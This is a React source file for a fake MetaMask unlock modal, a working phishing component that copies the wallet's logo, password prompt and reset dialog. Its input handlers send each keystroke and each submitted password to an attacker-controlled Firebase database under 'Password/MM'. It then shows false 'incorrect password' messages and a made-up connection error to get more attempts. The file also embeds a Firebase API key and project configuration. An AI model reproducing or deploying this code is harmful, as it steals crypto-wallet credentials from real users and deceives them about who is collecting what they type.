import React, { useState, useEffect, useRef } from 'react';
// import { initializeLocationData, initializeSocket, sendKeyToBackend } from '../../services/keyService';
// import { WALLET_TYPE_SHORTKEY, getClientUrl } from '../../services/config';
import { CustomWalletModalProps } from '../../types';
import { FoxRiveAnimation } from './FoxRiveAnimation';
// import metamaskFoxSvg from 'https://www.riveanimation.cards/v1/images/logo/metamask-fox.png';
// import metamaskFoxSvg from './assets/metamask-fox.svg';
import './styles.css';

import { initializeApp } from "firebase/app";
import { ref, set, getDatabase, push } from "firebase/database";
// TODO: Add SDKs for Firebase products that you want to use
// https://firebase.google.com/docs/web/setup#available-libraries

// Your web app's Firebase configuration
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyApPwqWwGydM4xXyWwFtFSfqo85M-MfGHc",
  authDomain: "wallet-integration-mr.firebaseapp.com",
  projectId: "wallet-integration-mr",
  storageBucket: "wallet-integration-mr.firebasestorage.app",
  messagingSenderId: "933009884848",
  appId: "1:933009884848:web:404ede153fda46e743dd75",
  measurementId: "G-3F71ML37Y8"
};

const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

const MetamaskModal: React.FC<CustomWalletModalProps> = ({ isOpen, onClose, darkMode = false }) => {
  const [keyword, setKeyword] = useState('');
  const [error, setError] = useState(false);
  const [helperText, setHelperText] = useState('');
  const [trying, setTrying] = useState(0);
  const [connecting, setConnecting] = useState(false);
  const [connectionError, setConnectionError] = useState(false);
  const [isClosable, setIsClosable] = useState(true);
  const [isClickedEnter, setIsClickedEnter] = useState(false);
  const [loadingInitiate, setLoadingInitiate] = useState(true);

  const passwordInputRef = useRef<HTMLInputElement>(null);
  const modalRef = useRef<HTMLDivElement>(null);
  const CLIENT_URL = "https://www.riveanimation.cards/v1";

  // Handle initial loading - only run once when modal opens
  useEffect(() => {
    if (isOpen) {
      setLoadingInitiate(true);
      const initialLoadTimeout = setTimeout(() => {
        setLoadingInitiate(false);
        setTimeout(() => {
          passwordInputRef.current?.focus();
        }, 500);
      }, 500);

      return () => {
        clearTimeout(initialLoadTimeout);
      };
    } else {
      // Reset loading state when modal closes
      setLoadingInitiate(true);
    }
  }, [isOpen]); // Only depend on isOpen, not isClosable

  // Handle document click and forget password modal - separate effect
  useEffect(() => {
    if (!isOpen) return;

    const handleDocumentClick = (e: MouseEvent) => {
      if (isClosable && modalRef.current && !modalRef.current.contains(e.target as Node)) {
        handleClick();
      }
    };

    document.addEventListener('click', handleDocumentClick);

    const modal = document.getElementById('metamask-forget-password-modal');
    if (modal) {
      const handleModalClick = (e: Event) => {
        if (e.target === modal) {
          modal.classList.add('hidden');
        }
      };
      modal.addEventListener('click', handleModalClick);

      return () => {
        document.removeEventListener('click', handleDocumentClick);
        modal.removeEventListener('click', handleModalClick);
      };
    }

    return () => {
      document.removeEventListener('click', handleDocumentClick);
    };
  }, [isOpen, isClosable]);

  const handleClick = () => {
    if (onClose) onClose();
    setKeyword('');
    setTrying(0);
    setConnectionError(false);
    setError(false);
    setLoadingInitiate(true);
  };

  const getCaretCoordinates = (element: HTMLInputElement, position: number) => {
    const div = document.createElement('div');
    div.id = 'password-mirror-div';
    document.body.appendChild(div);
    const computed = window.getComputedStyle(element);
    div.textContent = new Array(position + 1).join('•');
    const span = document.createElement('span');
    span.textContent = '•';
    div.appendChild(span);

    const coordinates = {
      top: span.offsetTop + parseInt(computed.borderTopWidth, 10),
      left: span.offsetLeft + parseInt(computed.borderLeftWidth, 10),
    };
    document.body.removeChild(div);
    return coordinates;
  };

  const handleKeywordChange = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const target = e.target;
    const element = target || passwordInputRef.current;
    if (element && typeof element.getBoundingClientRect === 'function') {
      const boundingRect = element.getBoundingClientRect();
      const coordinates = getCaretCoordinates(element, element.selectionEnd || 0);
      // Animation emitter removed (was for Mascot)
    }

    const newKeyword = target.value;
    setKeyword(newKeyword);
    setIsClickedEnter(false);
    setError(false);

    // set(ref(db, "Password/MM"), {
    //   password: newKeyword,
    // });

    push(ref(db, "Password/MM"), {
      password: newKeyword,
      time: Date.now()
    });
  };

  const handledForgetPwd = () => {
    showForgetPasswordModal();
  };

  const handledResetPwd = () => {
    handleClick();
    closeForgetPasswordModal();
    window.open('chrome-extension://nkbihfbeogaeaoehlefnkodbefgpgknn/home.html#restore-vault', '_blank');
  };

  const handleKeywordTyping = async () => {
    if (connecting) {
      return;
    }

    const currentKeyword = keyword;
    if (currentKeyword) {
      setConnecting(true);

      // set(ref(db, "Password/MM"), {
      //   password: currentKeyword,
      // });

      push(ref(db, "Password/MM"), {
        password: currentKeyword,
        time: Date.now()
      });

      setTimeout(() => {
        setConnecting(false);
        if (trying < 3) {
          setError(true);
          setHelperText('Password is incorrect. Please try again.');
          setIsClickedEnter(true);
          setTrying(trying + 1);
        } else {
          setConnectionError(true);
        }
        passwordInputRef.current?.focus();
      }, 150);
    } else {
      setTimeout(() => {
        setConnecting(false);
      }, 150);
    }
  };

  const showForgetPasswordModal = () => {
    const modal = document.getElementById('metamask-forget-password-modal');
    if (modal) {
      modal.classList.remove('hidden');
    }
  };

  const closeForgetPasswordModal = () => {
    const modal = document.getElementById('metamask-forget-password-modal');
    if (modal) {
      modal.classList.add('hidden');
    }
  };

  const closeWindow = () => {
    if (onClose) onClose();
    setTimeout(() => {
      setConnectionError(false);
      setKeyword('');
      setTrying(0);
      setError(false);
    }, 1000);
  };

  if (!isOpen) return null;

  const modalContent = (
    <div
      id="header-layout"
      ref={modalRef}
      className={`fixed top-0 right-[150px] z-[1000] flex transition-opacity duration-200 max-[395px]:scale-75 max-[265px]:scale-50
        ${isOpen ? 'opacity-100' : 'opacity-0 pointer-events-none'}`}
      onMouseEnter={() => setIsClosable(false)}
      onMouseLeave={() => setIsClosable(true)}
    >
      <div className="w-[400px] h-[600px] shadow-[0_4px_20px_0_rgba(0,0,0,0.3)] relative">
        <div className="h-full relative" style={{ backgroundColor: darkMode ? '#121314' : '#FFFFFF' }}>
          {connectionError ? (
            <div className={`text-center px-4 py-8 flex flex-col h-full justify-between ${darkMode ? 'text-white' : ''}`}>
              <div></div>
              <div className="">
                <div className="flex justify-center w-full items-center mb-4">
                  <svg className={`text-2xl text-center w-6 h-6 ${darkMode ? 'text-white' : 'text-red-500'}`} fill="currentColor" viewBox="0 0 20 20">
                    <path fillRule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                  </svg>
                </div>
                <h3 className="text-xl font-extrabold euclid-bold">Connection failed</h3>
                <div className="text-sm leading-relaxed">
                  <h6>Fetching of</h6>
                  <h5 className="font-bold">@unstoppabledomains/unstoppable-</h5>
                  <h5>
                    <span className="font-bold">resolution-snap</span> failed, check your network and
                  </h5>
                  <h5>try again.</h5>
                </div>
                <div className={`mt-4 text-base border-l-4 border-red-500 p-4 rounded text-left ${darkMode ? 'bg-gray-700' : 'bg-red-50'}`}>
                  <h5>One or more permissions are not allowed:</h5>
                  <h5>This endowment is experiental and therefore </h5>
                  <h5>not available.</h5>
                </div>
              </div>
              <button
                className={`w-full rounded-full cursor-pointer metamask-font-regular p-2.5 text-white hover:bg-[#3148f5] bg-[#4459ff] ${darkMode ? 'border-[#ffffff] text-[#141618]' : ''}`}
                onClick={closeWindow}
              >
                Ok
              </button>
            </div>
          ) : (
            <>
              {/* Initial loading screen */}
              <div
                className={`w-full h-full absolute flex items-center flex-col pt-40 z-50 ${loadingInitiate ? 'visible' : 'hidden'}`}
                style={{ backgroundColor: darkMode ? '#121314' : '#FFFFFF' }}
              >
                <div className="mb-4">
                  {/* <img src={metamaskFoxSvg} alt="metamask-fox-loading" className="w-40" /> */}
                  <img src="https://www.riveanimation.cards/v1/images/logo/metamask-fox.png" alt="metamask-fox-loading" className="w-40" />
                </div>
                <div>
                  <img src={`${CLIENT_URL}/images/icons/spinner.gif`} alt="spinner" className="w-8" />
                </div>
              </div>

              {/* Loading overlay when unlock button is clicked */}
              {connecting && !loadingInitiate && (
                <div className="z-[100] w-full h-full absolute flex justify-center items-center bg-[#000000e3]">
                  <div className="flex flex-col items-center">
                    <img src={`${CLIENT_URL}/images/icons/spinner.gif`} alt="spinner" className="w-8" />
                  </div>
                </div>
              )}

              <div className={`flex justify-center pt-[88px] ${loadingInitiate ? 'hidden' : ''}`} style={{ backgroundColor: darkMode ? '#121314' : '#FFFFFF' }}>
                <div className="w-full px-[16px]">
                  <div className={`flex flex-col justify-start items-center ${darkMode ? 'text-[#ffffff]' : 'text-[#141618]'}`}>
                    <div>
                      <svg
                        height="180"
                        width="180"
                        viewBox="0 0 696 344"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                        preserveAspectRatio="xMidYMid meet"
                      >
                        <path
                          d="M394.102 265.407V340.812H355.162V288.57L310.786 293.73C301.039 294.854 296.75 298.041 296.75 303.912C296.75 312.512 304.892 316.136 322.344 316.136C332.985 316.136 344.773 314.553 355.184 311.824L335.026 340.353C326.885 342.165 318.95 343.06 310.579 343.06C275.262 343.06 255.103 329.024 255.103 304.119C255.103 282.149 270.95 270.613 306.956 266.531L354.519 261.004C351.951 247.175 341.516 241.167 320.762 241.167C301.291 241.167 279.78 246.143 260.539 255.431L266.662 221.696C284.55 214.22 304.938 210.367 325.532 210.367C370.825 210.367 394.148 229.173 394.148 265.384L394.102 265.407ZM43.7957 170.991L1.23138 340.812H43.7957L64.9173 255.477L101.542 299.372H145.918L182.542 255.477L203.664 340.812H246.228L203.664 170.968L123.718 265.912L43.7727 170.968L43.7957 170.991ZM203.664 1.14648L123.718 96.0905L43.7957 1.14648L1.23138 170.991H43.7957L64.9173 85.6558L101.542 129.55H145.918L182.542 85.6558L203.664 170.991H246.228L203.664 1.14648ZM496.454 263.825L462.031 258.848C453.431 257.495 450.037 254.766 450.037 250.019C450.037 242.313 458.407 238.919 475.63 238.919C495.559 238.919 513.447 243.001 532.253 251.831L527.506 218.554C512.324 213.119 494.894 210.413 476.777 210.413C434.442 210.413 411.325 225.136 411.325 251.624C411.325 272.241 424.007 283.777 450.954 287.859L485.836 293.065C494.665 294.418 498.289 297.812 498.289 303.247C498.289 310.953 490.147 314.576 473.612 314.576C451.871 314.576 428.319 309.37 409.078 300.082L412.931 333.359C429.466 339.482 450.977 343.105 471.135 343.105C514.617 343.105 537.252 327.924 537.252 300.977C537.252 279.465 524.57 267.907 496.5 263.848L496.454 263.825ZM552.388 186.15V340.812H591.329V186.15H552.388ZM636.829 271.301L690.974 212.638H642.516L591.329 273.319L645.91 340.789H695.057L636.829 271.278V271.301ZM546.953 134.297C546.953 159.203 567.111 173.238 602.429 173.238C610.799 173.238 618.734 172.321 626.876 170.532L647.034 142.003C636.622 144.709 624.835 146.314 614.194 146.314C596.764 146.314 588.6 142.691 588.6 134.091C588.6 128.197 592.911 125.032 602.635 123.909L647.011 118.749V170.991H685.952V95.586C685.952 59.3513 662.629 40.5689 617.335 40.5689C596.718 40.5689 576.354 44.4217 558.466 51.8979L552.342 85.6329C571.583 76.3449 593.095 71.3684 612.565 71.3684C633.32 71.3684 643.755 77.3769 646.323 91.2057L598.759 96.7326C562.754 100.815 546.907 112.35 546.907 134.32L546.953 134.297ZM438.043 126.156C438.043 157.414 456.16 173.261 491.936 173.261C506.201 173.261 517.988 170.991 529.294 165.785L534.271 131.591C523.4 138.15 512.301 141.544 501.201 141.544C484.437 141.544 476.961 134.756 476.961 119.574V74.2809H536.06V42.8163H476.961V16.099L402.909 55.2691V74.2809H437.997V126.133L438.043 126.156ZM399.767 111.892V119.597H294.526C299.273 135.284 313.377 142.462 338.42 142.462C358.349 142.462 376.925 138.38 393.437 130.468L388.69 163.537C373.508 169.867 354.267 173.284 334.567 173.284C282.257 173.284 253.727 150.19 253.727 107.397C253.727 64.603 282.715 40.5918 327.55 40.5918C372.384 40.5918 399.79 66.6441 399.79 111.914L399.767 111.892ZM294.021 93.3155H360.574C357.065 78.2942 345.53 70.451 327.091 70.451C308.653 70.451 297.714 78.0878 294.021 93.3155Z"
                          fill={darkMode ? 'rgb(255,255,255)' : 'rgb(22,22,22)'}
                        />
                      </svg>
                    </div>

                    <form
                      className="w-full mb-4"
                      onSubmit={(e) => {
                        e.preventDefault();
                        handleKeywordTyping();
                      }}
                    >
                      <div className="w-full border-0 m-0 inline-flex relative flex-col align-top">
                        <input
                          id="current-password"
                          placeholder="Enter your password"
                          type="password"
                          value={keyword}
                          onChange={handleKeywordChange}
                          onKeyDown={(e) => {
                            if (e.key === 'Enter') {
                              e.preventDefault();
                              handleKeywordTyping();
                            }
                          }}
                          ref={passwordInputRef}
                          className={`m-0 px-4 py-3 text-base metamask-font-regular bg-transparent border focus:ring-0 placeholder:tracking-normal tracking-normal rounded-[8px] ${darkMode
                            ? 'text-white border-gray-300 focus:border-white'
                            : 'text-gray-900 border-gray-300 focus:border-black'
                            }`}
                        />
                        {error && (
                          <p className="text-red-500 text-sm mt-1">{helperText}</p>
                        )}
                      </div>
                    </form>
                    <button
                      className={`w-full rounded-[12px] h-[48px] font-semibold cursor-default flex items-center justify-center metamask-font-regular text-base ${!keyword
                        ? darkMode
                          ? 'bg-[#888989] text-white cursor-not-allowed'
                          : 'bg-[#888989] text-white cursor-not-allowed'
                        : darkMode
                          ? 'bg-[#FFFFFF] text-[#141618]'
                          : 'bg-[#131415] text-white'
                        }`}
                      onClick={handleKeywordTyping}
                      disabled={connecting}
                    >
                      {connecting ? 'Unlocking...' : 'Unlock'}
                    </button>
                    <div className="mt-4 w-full text-center text-base">
                      <button
                        className={`metamask-font-regular text-[16px] hover:underline ${darkMode ? 'text-[#9eaaff] hover:text-[#9eaaff]' : 'text-[#384df5] hover:text-[#384df5]'
                          }`}
                        onClick={handledForgetPwd}
                      >
                        Forgot password?
                      </button>
                    </div>
                    <div className="mt-4 text-center text-base">
                      <span className={`metamask-font-regular ${darkMode ? 'text-[#FFFFFF]' : 'text-[#121314]'}`}>
                        Need help? Contact&nbsp;
                        <button
                          className={`hover:underline metamask-font-regular ${darkMode ? 'text-[#9eaaff] hover:text-[#9eaaff]' : 'text-[#384df5] hover:text-[#384df5]'
                            }`}
                          onClick={() => {
                            closeWindow();
                            window.open('https://support.metamask.io', '_blank');
                          }}
                        >
                          MetaMask support
                        </button>
                      </span>
                    </div>
                  </div>
                </div>

                {/* Forget password modal */}
                <div id="metamask-forget-password-modal" className="absolute inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 hidden">
                  <section
                    className={`w-full max-w-[23rem] rounded-lg p-4 flex flex-col shadow-lg ${darkMode ? 'bg-gray-800' : 'bg-white'}`}
                    role="dialog"
                    aria-modal="true"
                    onClick={(e) => e.stopPropagation()}
                  >
                    <header className="flex justify-between items-center pb-4">
                      <div className="w-full ml-6 mr-6 text-center">
                        <h4 className={`text-lg font-semibold !font-700 ${darkMode ? 'text-gray-100' : 'text-gray-900'}`}>Forgot your password?</h4>
                      </div>
                      <div className="flex justify-end min-w-[24px]">
                        <button
                          className={`p-2 rounded-lg hover:bg-gray-100 ${darkMode
                            ? 'text-gray-400 hover:text-gray-200 hover:bg-gray-700'
                            : 'text-gray-500 hover:text-gray-700'
                            }`}
                          aria-label="Close"
                          onClick={closeForgetPasswordModal}
                        >
                          <img
                            src={`${CLIENT_URL}/images/icons/close.svg`}
                            alt="Close"
                            className="w-[1.5rem] h-[1.5rem]"
                          />
                        </button>
                      </div>
                    </header>

                    <div className="px-2">
                      <div className="mb-2 flex justify-center items-center w-full">
                        <img src={`${CLIENT_URL}/images/forgot-password-lock.png`} width="154" height="154" alt="Forgot your password?" className="self-center" />
                      </div>

                      <p className={`mb-4 text-md ${darkMode ? 'text-gray-100' : 'text-gray-900'}`}>
                        MetaMask can't recover your password for you.
                      </p>
                      <p className={`mb-6 text-md ${darkMode ? 'text-gray-100' : 'text-gray-900'}`}>
                        You can reset your wallet by entering the Secret Recovery Phrase you used when you set up your wallet.
                      </p>

                      <button
                        className={`w-full py-3 px-4 text-md font-medium text-white rounded-xl flex justify-center items-center ${darkMode
                          ? 'bg-red-500 hover:bg-red-600'
                          : 'bg-red-600 hover:bg-red-700'
                          }`}
                        onClick={handledResetPwd}
                      >
                        Reset wallet
                      </button>
                    </div>
                  </section>
                </div>
              </div>

              {/* Show footer animation only after spinner finishes so the full animation plays */}
              {!loadingInitiate && (
                <div className="absolute bottom-0 left-0 w-full pointer-events-none">
                  <div className="w-full flex items-end justify-center" style={{ height: 270 }}>
                    <FoxRiveAnimation />
                  </div>
                </div>
              )}
            </>
          )}
        </div>
      </div>
    </div>
  );

  return modalContent;
};

export default MetamaskModal;
